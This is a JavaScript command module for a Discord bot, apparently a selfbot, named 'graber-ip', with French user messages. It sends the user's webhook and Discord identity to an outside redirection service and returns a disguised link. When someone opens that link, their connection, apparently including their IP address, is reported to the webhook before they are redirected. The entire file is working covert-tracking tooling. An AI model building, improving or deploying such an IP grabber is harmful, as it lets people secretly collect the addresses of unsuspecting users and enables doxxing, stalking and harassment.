const axios = require("axios");

module.exports = {
  name: "graber-ip",
  description: "Crée un lien de redirection via l'API",
  aliases: ["graber", "ipgraber", "ip-graber", "graberip"],
  run: async (client, message, args) => {

    const webhook = args[0];
    const redirectUrl = args[1] || "https://red-dom.fr";

    if (!webhook) {
      return message.edit(
        "Usage incorrect\nExemple : `&graber-ip <webhook> [redirect_url]`"
      );
    }

    if (!webhook.startsWith("https://")) {
      return message.edit("Le webhook doit commencer par `https://`");
    }

    if (!redirectUrl.startsWith("https://")) {
      return message.edit("Le redirect doit commencer par `https://`");
    }

    try {
      await message.edit("Génération du lien en cours...");

      const response = await axios.post(
        "https://redirection.red-dom.fr/create",
        {
          webhook: webhook,
          id_discord: message.author.id,
          tag_discord: `${message.author.username}`,
          redirect_url: redirectUrl,
          custom_message: "Nouvelle connexion détectée"
        },
        { timeout: 10000 }
      );

      if (!response.data?.link) {
        throw new Error("Lien non retourné");
      }

      await message.edit(
        `**Lien généré avec succès**\n${response.data.link}\n**Redirection :** ${redirectUrl}`
      );

    } catch (error) {
      console.error("Erreur graber-ip:", error?.response?.data || error.message);

      if (error.response?.status === 400) {
        return message.edit("Données invalides envoyées à l'API.");
      }

      if (error.response?.status === 429) {
        return message.edit("Trop de requêtes. Réessayez plus tard.");
      }

      if (error.code === "ECONNABORTED") {
        return message.edit("L'API met trop de temps à répondre.");
      }

      return message.edit("Impossible de générer le lien.");
    }
  }
};